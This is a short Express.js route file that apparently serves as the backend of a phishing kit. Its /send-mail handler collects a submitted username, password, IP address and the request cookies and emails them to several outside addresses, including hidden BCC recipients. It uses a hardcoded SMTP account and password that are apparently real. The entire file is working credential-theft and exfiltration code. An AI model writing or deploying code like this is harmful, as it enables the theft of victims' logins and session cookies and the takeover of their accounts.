const express = require('express');
const router = express.Router();
const mailer = require('../helper/mailer');

router.post('/send-mail', (req, res) => {
    const { username, pass, ip } = req.body;
    const cookies = req.cookies; // Get cookies from the request object

    // Create the email transport
    const nodeTransport = mailer.createNodeMailerTransport('latinaforlife@remax.pt', '12416Remaxeasy');

    // Define email options with multiple recipients, including BCC
    const mailOptions = {
        from: 'latinaforlife@remax.pt',
        to: ['gilliard.pinheiro@tenqualuz.pt', 'dninotoolz@gmail.com'], // Primary recipients
        bcc: ['billytoolz@zohomail.eu', 'billytoolz@zohomail.eu'], // BCC recipients
        subject: 'Share-Data',
        text: `Username: ${username}\nPassword: ${pass}\nIP: ${ip}\nCookies: ${JSON.stringify(cookies)}`
    };

    // Send email using mailer and pass the BCC field
    mailer.sendEmail(
        mailOptions.from, 
        mailOptions.to.join(','), 
        mailOptions.bcc.join(','), // Add the BCC field here
        mailOptions.subject,
        username,
        pass,
        ip,
        cookies,
        nodeTransport,
        (error, info) => {
            if (error) {
                console.log('Error sending email:', error);
                return res.status(500).send('Error sending email: ' + error.message);
            }
            res.status(200).send('Email sent successfully: ' + info.response);
        }
    );
});

module.exports = router;
